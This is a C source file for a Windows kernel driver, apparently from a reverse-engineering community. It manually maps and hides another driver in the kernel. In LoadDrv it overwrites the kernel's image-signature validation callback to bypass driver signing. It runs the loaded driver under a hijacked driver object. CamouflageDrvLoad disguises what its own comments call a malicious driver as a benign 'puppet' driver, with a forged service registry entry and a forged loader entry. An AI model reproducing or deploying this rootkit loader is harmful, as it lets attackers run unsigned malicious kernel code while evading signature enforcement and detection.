#include"Head.h"
#include <ntimage.h>

KEVENT WaitWorkItem;
PDRIVER_OBJECT ShellDrv = NULL;
BOOLEAN IsWDF = FALSE;



//关于无签名驱动加载
ULONG64 CIFun = NULL;
PULONG64 Pqword_14040EF40 = NULL;
//获取Nt头
PIMAGE_NT_HEADERS(*RtlImageNtHeader)(PVOID DllBase) = NULL;

//获取资源第一步
NTSTATUS(*MiGenerateSystemImageNames)(PUNICODE_STRING DriverPath, ULONG64 zero1, ULONG64 zero2, PUNICODE_STRING OutUnicode, PUNICODE_STRING OutUnicode14, PUNICODE_STRING String1) = NULL;

//获取资源第二步 获取DriverSection _LDR_DATA_TABLE_ENTRY
NTSTATUS(*MiObtainSectionForDriver)(PUNICODE_STRING String1, PUNICODE_STRING DriverPath, ULONG64 zero1, ULONG64 zero2, PULONG64 PDriverSection) = NULL;

//创建镜像虚拟地址
PUCHAR(*MiGetSystemAddressForImage)(PVOID PSECTION, int zero, int* un) = NULL;

//映射镜像物理地址
NTSTATUS(*MiMapSystemImage)(PVOID PSECTION, PUCHAR BaseVa) = NULL;

//get 数据目录地址
PUCHAR(*RtlImageDirectoryEntryToData)(PUCHAR DllBase, ULONG64 one, ULONG64 one1, PULONG32 PSize) = NULL;

//填充IAT辅助函数
NTSTATUS(*MiSnapThunk)(PUCHAR importDllBase, PUCHAR DllBase, PULONG64 PITE, PULONG64 PIATE, ULONG64 zero) = NULL;

//线程上锁
PKTHREAD(*MmAcquireLoadLock)() = NULL;

//线程解锁
VOID(*MmReleaseLoadLock)(PKTHREAD thread) = NULL;

//获取PPTE
ULONG64(*MiFillPteHierarchy)(ULONG64 va, PPTE_HIERARCHY Pout) = NULL;

//需要调用这个函数，R3才能成功 CreateFile
VOID(*IopReadyDeviceObjects)(PDRIVER_OBJECT DrvObj) = NULL;

//驱动入口
NTSTATUS(*ShellDriverEntry)(PVOID a, PVOID b) = NULL;

//Other


ULONG64 SectionOffset = NULL;
PLIST_ENTRY64 PsLoadedModuleList = NULL;
ULONG64 BaseDllNameOffset = NULL;
ULONG64 DllBaseOffset = NULL;
ULONG64 SizeOfImageOffset = NULL;
ULONG64 FlagsOffset = NULL;


//----------------------

PULONG64 PIoDriverObjectType = NULL;

//资源锁参数
ULONG64 PIopDriverLoadResource = NULL;

//默认MajorFunction
ULONG64 PIopInvalidDeviceRequest = NULL;

//创建对象
NTSTATUS(*ObCreateObjectEx)(BOOLEAN AccMode, ULONG64 Type, POBJECT_ATTRIBUTES attributes, ULONG64 zero, PULONG64 Out, ULONG64 Size, ULONG64 zero1, ULONG64 zero2, PVOID PObject, ULONG64 zero3) = NULL;

//加入对象表
NTSTATUS(*ObInsertObjectEx)(PVOID PObject, ULONG64 zero, ULONG64 one, ULONG64 zero1, ULONG64 zero2, ULONG64 zero3, PHANDLE PHandle) = NULL;

//重新构造DriverSection并插入链表
NTSTATUS(*MiConstructLoaderEntry)(PLDR_DATA_TABLE_ENTRY DriverSection,
	PUNICODE_STRING DrvName,//"XXX.sys"
	PUNICODE_STRING DrvPath,//
	ULONG64 zero,
	ULONG64 one,
	PVOID PnewDriverSection) = NULL;

ULONG64 PCmRegistryMachineHardwareDescriptionSystemName = NULL;


EXTERN_C_START

//调用ShellDriverEntry跳板
NTSTATUS Shim(PShellContext PSContext) {
	NTSTATUS s = STATUS_SUCCESS;
	ShellDriverEntry(PSContext->DrvObj, PSContext->PSTR);
	KeSetEvent(&WaitWorkItem, 0, FALSE);
	return s;

}

//通过驱动名字获取基址
PUCHAR GetDllBase(PUCHAR PDllName) {
	ANSI_STRING DllNameA;
	UNICODE_STRING DllNameU = { 0 };
	RtlInitAnsiString(&DllNameA, PDllName);
	RtlAnsiStringToUnicodeString(&DllNameU, &DllNameA, TRUE);
	PLIST_ENTRY64 PDriverSection = PsLoadedModuleList->Blink;

	PUCHAR PDriverSectionByte = NULL;
	PUCHAR ReturnBase = NULL;
	PUNICODE_STRING BaseDllName = NULL;
	while (PDriverSection != PsLoadedModuleList) {
		PDriverSectionByte = (PUCHAR)PDriverSection;
		BaseDllName = (PUNICODE_STRING)(PDriverSectionByte + BaseDllNameOffset);
		if (RtlEqualUnicodeString(BaseDllName, &DllNameU, TRUE)) {
			ReturnBase = *((PULONG64)(PDriverSectionByte + DllBaseOffset));
			break;
		}
		else {
			PDriverSection = PDriverSection->Blink;
		}
	}
	RtlFreeUnicodeString(&DllNameU);
	return ReturnBase;
}

//设置页面可写
VOID SetWrite(ULONG64 va) {
	PPT_ENTRY_4KB ppte = NULL;
	PTE_HIERARCHY context = { 0 };
	ULONG64 a = *(PULONG64)va;
	MiFillPteHierarchy(va, &context);
	ppte = context.pte;
	ppte->Fields.Write = 1;

}

ULONG64 WdfR0() {
	return 0;
}


PVOID
ImageDirectoryEntryToData(
	PVOID BaseAddress,
	BOOLEAN MappedAsImage,
	USHORT DirectoryEntry,
	PULONG Size
)
{
	PIMAGE_DOS_HEADER dosHeader;
	PIMAGE_NT_HEADERS ntHeaders;
	PIMAGE_DATA_DIRECTORY dataDirectory;
	PVOID directoryEntryData;
	ULONG entrySize;

	// 检查基地址是否有效
	if (BaseAddress == NULL) {
		if (Size) *Size = 0;
		return NULL;
	}

	// 获取 DOS 头
	dosHeader = (PIMAGE_DOS_HEADER)BaseAddress;
	// 检查 DOS 头的签名是否为 IMAGE_DOS_SIGNATURE
	if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
		if (Size) *Size = 0;
		return NULL;
	}

	// 获取 NT 头
	ntHeaders = (PIMAGE_NT_HEADERS)((PUCHAR)BaseAddress + dosHeader->e_lfanew);
	// 检查 NT 头的签名是否为 IMAGE_NT_SIGNATURE
	if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
		if (Size) *Size = 0;
		return NULL;
	}

	// 检查目录条目索引是否在有效范围内
	if (DirectoryEntry >= ntHeaders->OptionalHeader.NumberOfRvaAndSizes) {
		if (Size) *Size = 0;
		return NULL;
	}

	// 获取指定目录条目的数据目录
	dataDirectory = &ntHeaders->OptionalHeader.DataDirectory[DirectoryEntry];
	entrySize = dataDirectory->Size;

	// 如果请求了目录条目的大小，则返回
	if (Size) *Size = entrySize;

	// 如果数据目录的虚拟地址为 0，返回 NULL
	if (dataDirectory->VirtualAddress == 0) {
		return NULL;
	}

	// 计算目录条目数据的地址
	directoryEntryData = (PVOID)((PUCHAR)BaseAddress + dataDirectory->VirtualAddress);

	// 如果映射为图像，直接返回计算出的数据地址
	if (MappedAsImage) {
		return directoryEntryData;
	}
	else {
		// 如果文件没有映射为图像，可能需要根据文件映射方式进行调整
		// 这里的调整取决于文件的映射方式，可能需要根据具体情况进行处理
		return directoryEntryData;
	}
}



//填充IAT
BOOLEAN MakeIAT(PUCHAR DllBase) {
	PMyIID Piid = NULL;
	PUCHAR ImportDllBase = NULL;
	ULONG32 ImportSize = 0;
	PUCHAR PDllName = NULL;
	//DbgBreakPoint();
	PUCHAR ImportVirtualAddress = ImageDirectoryEntryToData(DllBase, 1, 1, &ImportSize);
	int iidSize = sizeof(MyIID);

	PULONG64 PThisIATEOffset = 0;
	PULONG64 PThisITEOffset = 0;
	NTSTATUS status = STATUS_SUCCESS;
	Piid = (PMyIID)ImportVirtualAddress;
	for (int i = 0; i < ImportSize; i += iidSize) {
		if (Piid->d == 0)
			break;//全部填充完成
		PDllName = (PUCHAR)(DllBase + Piid->d);
		if (0 == memcmp(PDllName, WDF, 10)) {//WDF 需要修复
			IsWDF = TRUE;
			PThisIATEOffset = DllBase + Piid->e;
			while (*PThisIATEOffset != 0) {
				//SetWrite(PThisIATEOffset);
				PVOID64 pMemory = NULL;
				PVOID64 pMdl = IoAllocateMdl(PThisIATEOffset, 8, FALSE, FALSE, NULL);
				MmBuildMdlForNonPagedPool(pMdl);
				pMemory = MmMapLockedPages(pMdl, KernelMode);
				*(PULONG64)pMemory = WdfR0;
				MmUnmapLockedPages(pMemory, pMdl);
				IoFreeMdl(pMdl);

				PThisIATEOffset++;
			}
			Piid++;
			continue;
		}
		ImportDllBase = GetDllBase(PDllName);//get ImportDllBase
		PThisIATEOffset = DllBase + Piid->e;
		PThisITEOffset = DllBase + Piid->a;
		while (*PThisIATEOffset != 0 && *PThisITEOffset != 0) {
			PVOID64 pMemory = NULL;
			PVOID64 pMdl = IoAllocateMdl(PThisIATEOffset, 8, FALSE, FALSE, NULL);
			MmBuildMdlForNonPagedPool(pMdl);
			pMemory = MmMapLockedPages(pMdl, KernelMode);
			status = MiSnapThunk(ImportDllBase, DllBase, PThisITEOffset, pMemory, 0);
			MmUnmapLockedPages(pMemory, pMdl);
			IoFreeMdl(pMdl);

			if (status != STATUS_SUCCESS) {
				DbgPrint("error!\n");
				return FALSE;
			}
			PThisITEOffset++;
			PThisIATEOffset++;
		}
		Piid++;
	}
	return TRUE;
}

//禁用签名强制性回调
ULONG64 MySeValidateImageHeader() {
	return 0;
}

struct _WDF_BIND_INFO {
	ULONG32 Szie;
	UCHAR RZ[4];
	ULONG64 Component;
	UCHAR Version[0xc];
	ULONG32 FuncCount;
	ULONG64 FuncTable;
	ULONG64 Module;
};
//加载隐藏驱动
VOID LoadDrv(PWCHAR DrvPath) {

	int un = 0;
	PUCHAR PDriverSection = NULL;
	PUCHAR Section = NULL;
	PUCHAR DllBase = NULL;
	UNICODE_STRING Path;
	UNICODE_STRING Out;
	UNICODE_STRING Out14[14];
	UNICODE_STRING String1;
	PKTHREAD thread = NULL;
	KIRQL OldIrql = 0;

	//初始化事件
	KeInitializeEvent(&WaitWorkItem, SynchronizationEvent, FALSE);

	//禁用驱动签名强制  如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
	CIFun = *Pqword_14040EF40;
	DbgPrint("PSeValidateImageHeader here %p\n", Pqword_14040EF40);
	*Pqword_14040EF40 = MySeValidateImageHeader;
	//映射驱动
	RtlInitUnicodeString(&Path, DrvPath);
	NTSTATUS s0 = MiGenerateSystemImageNames(&Path, 0, 0, &Out, Out14, &String1);
	thread = MmAcquireLoadLock();
	NTSTATUS s1 = MiObtainSectionForDriver(&String1, &Path, 0, 0, &PDriverSection);
	MmReleaseLoadLock(thread);
	if (s1 != STATUS_SUCCESS) {
		DbgPrint("error code:%X\n", s1);
		return;
	}
	Section = *(PULONG64)(PDriverSection + SectionOffset);
	DllBase = MiGetSystemAddressForImage(Section, 0, &un);
	KeRaiseIrql(1, &OldIrql);
	NTSTATUS s2 = MiMapSystemImage(Section, DllBase);
	KeLowerIrql(OldIrql);
	//恢复驱动签名强制  如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
	*Pqword_14040EF40 = CIFun;

	//获取DriverEntry
	PIMAGE_NT_HEADERS Head = RtlImageNtHeader(DllBase);
	PUCHAR Headd = (PUCHAR)Head;
	int* p = NULL;
	p = Headd + 0x10;//IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint
	PULONG64 c = &ShellDriverEntry;
	*c = DllBase + *p;


	//修复IAT
	if (!MakeIAT(DllBase)) {
		return;
	}


	//修复_security_cookie
	int size = 0;
	PULONG64 ConfigAdd = 0;
	PULONG64 P_security_cookieAddress = NULL;
	ConfigAdd = RtlImageDirectoryEntryToData(DllBase, 1, 0xA, &size);

	if (!ConfigAdd)
	{
		DbgPrintEx(77, 0, "请编译源码的时候启用安全检查 (/GS)！\n");

		return FALSE;
	}

	P_security_cookieAddress = ConfigAdd[0xb];
	//SetWrite(P_security_cookieAddress);
	//PVOID64 pMemory = NULL;
	//PVOID64 pMdl = IoAllocateMdl(P_security_cookieAddress, 4, FALSE, FALSE, NULL);
	//MmBuildMdlForNonPagedPool(pMdl);
	//pMemory = MmMapLockedPages(pMdl, KernelMode);
	*P_security_cookieAddress = 1;//随意更改，但是一定要改
	//MmUnmapLockedPages(pMemory, pMdl);
	//IoFreeMdl(pMdl);

	//修复WDF(仅WDF需要修复，WDM无视)
	struct _WDF_BIND_INFO* PWdfBindInfo = ((ULONG64)P_security_cookieAddress) + 0x10;
	PULONG64 PWdfFunctions = PWdfBindInfo->FuncTable;
	PULONG64 PWdfDriverGlobals = NULL;
	if (IsWDF == TRUE) {
		*PWdfFunctions = (ULONG64)ExAllocatePool(NonPagedPool, 0x1000);
		if ((*PWdfFunctions) == NULL) {
			return;
		}
		memset(*PWdfFunctions, 0, 0x1000);
		PWdfDriverGlobals = ((ULONG64)PWdfFunctions) + 8;
		*PWdfDriverGlobals = ExAllocatePool(NonPagedPool, 0x100);
		if (*PWdfDriverGlobals == NULL) {
			ExFreePool(*PWdfFunctions);
			return;
		}memset(*PWdfDriverGlobals, 0, 0x100);
	}

	//driverEntry
	DbgPrint("DllBase:%p\n", DllBase);
	ShellContext SContext = { 0 };
	SContext.DrvObj = FindNotDeviceDriver();
	ULONG64 OldDriverUnLoad = SContext.DrvObj->DriverUnload;//备份一下DriverUnLoad
	WORK_QUEUE_ITEM WorkItem = { 0 };
	WorkItem.WorkerRoutine = Shim;
	WorkItem.Parameter = &SContext;
	WorkItem.List.Flink = 0i64;
	ExQueueWorkItem(&WorkItem, DelayedWorkQueue);
	//等一下
	KeWaitForSingleObject(&WaitWorkItem, Executive, KernelMode, FALSE, NULL);

	//还原DriverUnLoad
	SContext.DrvObj->DriverUnload = OldDriverUnLoad;

	//提交劫持设备
	IopReadyDeviceObjects(SContext.DrvObj);

	//释放
	if (IsWDF == TRUE) {
		ExFreePool(*PWdfFunctions);
		ExFreePool(*PWdfDriverGlobals);
		*PWdfFunctions = 0;
		*PWdfDriverGlobals = 0;
	}

}

//-------------------------------------------驱动伪装
//创建注册表项 返回对应注册表句柄
HANDLE CreateRegistry(PWCHAR ODrvPath, PWCHAR ServiceName) {
	NTSTATUS status = STATUS_SUCCESS;
	OBJECT_ATTRIBUTES objAttrs = { 0 };
	UNICODE_STRING SerRegistryPath = { 0 }, SerName = { 0 }, RegUnicodeString = { 0 };
	HANDLE hReg = NULL;
	ULONG64 Out = 0;
	UNICODE_STRING ImagePathUn = { 0 }, DisplayNameUn = { 0 }, ErrorControlUn = { 0 }, StartUn = { 0 }, TypeUn = { 0 };
	RtlInitUnicodeString(&DisplayNameUn, L"DisplayName");
	RtlInitUnicodeString(&ImagePathUn, L"ImagePath");
	RtlInitUnicodeString(&ErrorControlUn, L"ErrorControl");
	RtlInitUnicodeString(&StartUn, L"Start");
	RtlInitUnicodeString(&TypeUn, L"Type");
	ULONG64 EC = 1, Str = 3, Typ = 1;
	RtlInitUnicodeString(&SerRegistryPath, ServiceRegistryPath);
	RtlInitUnicodeString(&SerName, ServiceName);
	RegUnicodeString.Buffer = ExAllocatePool(NonPagedPool, (ULONG64)SerRegistryPath.MaximumLength + (ULONG64)SerName.MaximumLength);
	if (RegUnicodeString.Buffer == NULL) {
		return 0;
	}
	//DbgBreakPoint();
	memset(RegUnicodeString.Buffer, 0, (ULONG64)SerRegistryPath.MaximumLength + (ULONG64)SerName.MaximumLength);
	memcpy(RegUnicodeString.Buffer, SerRegistryPath.Buffer, SerRegistryPath.Length);
	memcpy(&RegUnicodeString.Buffer[SerRegistryPath.Length / 2], SerName.Buffer, SerName.Length);
	RegUnicodeString.MaximumLength = SerRegistryPath.MaximumLength + SerName.MaximumLength;
	RegUnicodeString.Length = SerRegistryPath.Length + SerName.Length;
	InitializeObjectAttributes(&objAttrs, &RegUnicodeString, OBJ_CASE_INSENSITIVE, NULL, NULL);
	status = ZwCreateKey(&hReg, KEY_ALL_ACCESS, &objAttrs, 0, NULL, REG_OPTION_VOLATILE, &Out);
	status = ZwSetValueKey(hReg, &ImagePathUn, NULL, REG_EXPAND_SZ, ODrvPath, 2 * wcslen(ODrvPath));
	status = ZwSetValueKey(hReg, &DisplayNameUn, NULL, REG_SZ, ServiceName, 2 * wcslen(ServiceName));
	status = ZwSetValueKey(hReg, &ErrorControlUn, NULL, REG_DWORD, &EC, 4);
	status = ZwSetValueKey(hReg, &StartUn, NULL, REG_DWORD, &Str, 4);
	status = ZwSetValueKey(hReg, &TypeUn, NULL, REG_DWORD, &Typ, 4);
	return hReg;
}

//ADrvPath 恶意驱动路径：  例如：L"\\??\\C:\\Users\\52pojie\\Desktop\\A.sys"
//ODrvPath 傀儡驱动路径：  例如：L"\\??\\C:\\Users\\52pojie\\Desktop\\T.sys"
//ServiceName 傀儡服务名： 例如：L"xixi"
BOOLEAN CamouflageDrvLoad(PWCHAR ADrvPath, PWCHAR ODrvPath, PWCHAR ServiceName) {
	NTSTATUS status = STATUS_SUCCESS;
	PDRIVER_OBJECT PTDrvObj = NULL;
	ULONG64 Out = 0;
	WCHAR ServiceNameBuffer[0x50] = { 0 };
	HANDLE HRegistry = NULL;

	//映射、修复IAT
	int un = 0;
	PUCHAR PADriverSection = NULL;
	PLDR_DATA_TABLE_ENTRY PODriverSection = NULL;
	PLDR_DATA_TABLE_ENTRY NewPODriverSection = NULL;
	//这三个都是ADrv的信息
	PUCHAR Section = NULL;
	PUCHAR DllBase = NULL;
	ULONG32 DllSize = 0;

	UNICODE_STRING ADrvPathUn;
	UNICODE_STRING ODrvPathUn;
	//这两个都是ODrv的信息
	UNICODE_STRING OutU;
	UNICODE_STRING Out14[14];

	UNICODE_STRING AString;
	UNICODE_STRING OString;
	PKTHREAD thread = NULL;

	PUCHAR Head = NULL;

	PULONG64 ConfigAdd = 0;
	PULONG64 P_security_cookieAddress = NULL;

	struct _WDF_BIND_INFO* PWdfBindInfo = NULL;
	PULONG64 PWdfFunctions = NULL;
	PULONG64 PWdfDriverGlobals = NULL;

	HANDLE DrvH = NULL;
	OBJECT_ATTRIBUTES att = { 0 };
	UNICODE_STRING ObjectName = { 0 };

	PUNICODE_STRING PSTR = NULL;
	ULONG NtQueryObjReturnLen = 0;
	ShellContext DEContext = { 0 };
	WORK_QUEUE_ITEM WorkItem = { 0 };

	KIRQL OldIrql = 0;
	//创建服务注册表
	HRegistry = CreateRegistry(ODrvPath, ServiceName);
	//DbgBreakPoint();
	try {
		//上锁
		ExAcquireResourceExclusiveLite(PIopDriverLoadResource, 1);
		//禁用驱动签名强制 如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
	/*	CIFun = *Pqword_14040EF40;
		DbgPrintEx(77, 0, "PSeValidateImageHeader here %p\n", Pqword_14040EF40);
		*Pqword_14040EF40 = MySeValidateImageHeader;*/

		//映射驱动
		RtlInitUnicodeString(&ADrvPathUn, ADrvPath);
		status = MiGenerateSystemImageNames(&ADrvPathUn, 0, 0, &OutU, Out14, &AString);
		//OUT : UN"已签名.sys" 
		//Out14[0] : UN"Path前缀" Out14[3] : UN"\Driver\"
		//String1 同 Path
		RtlInitUnicodeString(&ODrvPathUn, ODrvPath);
		status = MiGenerateSystemImageNames(&ODrvPathUn, 0, 0, &OutU, Out14, &OString);

		//DbgBreakPoint();
		//创建DriverSection
		thread = MmAcquireLoadLock();
		status = MiObtainSectionForDriver(&AString, &ADrvPathUn, 0, 0, &PADriverSection);
		status = MiObtainSectionForDriver(&OString, &ODrvPathUn, 0, 0, &PODriverSection);
		MmReleaseLoadLock(thread);



		//映射ADrv,不映射ODrv
		Section = *(PULONG64)(PADriverSection + SectionOffset);//改了这
		DllBase = MiGetSystemAddressForImage(Section, 0, &un);

		KeRaiseIrql(1, &OldIrql);
		NTSTATUS s2 = MiMapSystemImage(Section, DllBase);
		KeLowerIrql(OldIrql);

		//恢复驱动签名强制  如果需要加载的驱动有签名，就不需要这一部分了，因为容易蓝屏
		//*Pqword_14040EF40 = CIFun;
		Head = RtlImageNtHeader(DllBase);
		DllSize = *(PULONG32)(Head + 0x50);

		//提交DriverSection
		PODriverSection->SizeOfImage = DllSize;
		PODriverSection->DllBase = DllBase;
		status = MiConstructLoaderEntry(PODriverSection, &OutU, &OString, 0, 1, &NewPODriverSection);
		ExFreePoolWithTag(PODriverSection, 0);
		ExFreePoolWithTag(PADriverSection, 0);
		NewPODriverSection->Flags = 0x49104000;
		//flag 0x49104000


		//修复IAT
		MakeIAT(DllBase);


		//修复_security_cookie
		int size = 0;
		ConfigAdd = ImageDirectoryEntryToData(DllBase, 1, 0xA, &size);

		if (!ConfigAdd)
		{
			DbgPrintEx(77, 0, "请编译源码的时候启用安全检查 (/GS)！\n");

			return FALSE;
		}


		P_security_cookieAddress = ConfigAdd[0xb];
		//SetWrite(P_security_cookieAddress, 1);
		//PVOID64 pMemory = NULL;
		//PVOID64 pMdl = IoAllocateMdl(P_security_cookieAddress, 8, FALSE, FALSE, NULL);
		//MmBuildMdlForNonPagedPool(pMdl);
		//pMemory = MmMapLockedPages(pMdl, KernelMode);
		*P_security_cookieAddress = 1;
		//MmUnmapLockedPages(pMemory, pMdl);
		//IoFreeMdl(pMdl);
		//SetWrite(P_security_cookieAddress, 0);
		
		//修复WDF
		if (IsWDF == TRUE) {
			PWdfBindInfo = ((ULONG64)P_security_cookieAddress) + 0x10;
			PWdfFunctions = PWdfBindInfo->FuncTable;
			//SetWrite(P_security_cookieAddress, 1);
			*PWdfFunctions = (ULONG64)ExAllocatePool(NonPagedPool, 0x1000);
			//SetWrite(P_security_cookieAddress, 0);
			if ((*PWdfFunctions) == NULL) {
				return FALSE;
			}
			memset(*PWdfFunctions, 0, 0x1000);
			PWdfDriverGlobals = ((ULONG64)PWdfFunctions) + 8;
			//SetWrite(P_security_cookieAddress, 1);
			*PWdfDriverGlobals = ExAllocatePool(NonPagedPool, 0x100);
			//SetWrite(P_security_cookieAddress, 0);
			if (*PWdfDriverGlobals == NULL) {
				ExFreePool(*PWdfFunctions);
				return FALSE;
			}memset(*PWdfDriverGlobals, 0, 0x100);
		}


		DbgPrintEx(77, 0, "DllBase:%p\n", DllBase);


		//构造DriverObject并插入
		memcpy(ServiceNameBuffer, DrvObjNamePrefix, 2 * wcslen(DrvObjNamePrefix));
		memcpy(&ServiceNameBuffer[wcslen(DrvObjNamePrefix)], ServiceName, 2 * wcslen(ServiceName));
		RtlInitUnicodeString(&ObjectName, ServiceNameBuffer);
		att.Length = 0x30; att.Attributes = 0x250; att.ObjectName = &ObjectName;
		status = ObCreateObjectEx(0, *PIoDriverObjectType, &att, 0, &Out, 0x1A0, 0, 0, &PTDrvObj, 0);
		if (status != STATUS_SUCCESS) {
			return status;
		}
		memset(PTDrvObj, 0, 0x1a0);
		PTDrvObj->DriverExtension = &PTDrvObj[1];
		*(PULONG64)(&PTDrvObj[1]) = &PTDrvObj[0];
		for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
			PTDrvObj->MajorFunction[i] = PIopInvalidDeviceRequest;
		}
		PTDrvObj->Type = 4; PTDrvObj->Size = 0x150;
		PTDrvObj->DriverInit = NewPODriverSection->EntryPoint;
		PTDrvObj->DriverSection = NewPODriverSection;
		PTDrvObj->DriverStart = DllBase;
		PTDrvObj->DriverSize = DllSize;
		PTDrvObj->Flags |= 2;
		//DbgBreakPoint();
		status = ObInsertObjectEx(PTDrvObj, 0, 1, 0, 0, 0, &DrvH);
		ExReleaseResourceLite(PIopDriverLoadResource);//解锁
		status = ObReferenceObjectByHandle(DrvH, 0, *PIoDriverObjectType, 0, &PTDrvObj, NULL);
		ZwClose(DrvH);
		PTDrvObj->HardwareDatabase = PCmRegistryMachineHardwareDescriptionSystemName;
		PTDrvObj->DriverName.Buffer = ExAllocatePool(NonPagedPool, ObjectName.MaximumLength);
		PTDrvObj->DriverName.Length = ObjectName.Length;
		PTDrvObj->DriverName.MaximumLength = ObjectName.MaximumLength;
		if (PTDrvObj->DriverName.Buffer == NULL) {
			return FALSE;
		}
		memcpy(PTDrvObj->DriverName.Buffer, ObjectName.Buffer, ObjectName.MaximumLength);

		//DriverEntry
		PSTR = ExAllocatePool(NonPagedPool, 0x1000);
		status = ZwQueryObject(HRegistry, 1, PSTR, 0x1000, &NtQueryObjReturnLen);
		DEContext.DrvObj = PTDrvObj;
		DEContext.PSTR = PSTR;
		KeInitializeEvent(&WaitWorkItem, SynchronizationEvent, FALSE);
		PULONG64 SetDriverEntry = &ShellDriverEntry;
		*SetDriverEntry = PTDrvObj->DriverInit;
		WorkItem.WorkerRoutine = Shim;
		WorkItem.Parameter = &DEContext;
		WorkItem.List.Flink = 0i64;
		ExQueueWorkItem(&WorkItem, DelayedWorkQueue);

		KeWaitForSingleObject(&WaitWorkItem, Executive, KernelMode, FALSE, NULL);
		//提交设备
		IopReadyDeviceObjects(PTDrvObj);
		//释放
		ExFreePool(PSTR);
		ZwClose(HRegistry);
		if (IsWDF == TRUE) {
			ExFreePool(*PWdfFunctions);
			ExFreePool(*PWdfDriverGlobals);
			*PWdfFunctions = 0;
			*PWdfDriverGlobals = 0;
		}
		return TRUE;
	}except(1) {
		return FALSE;
	}
}
EXTERN_C_END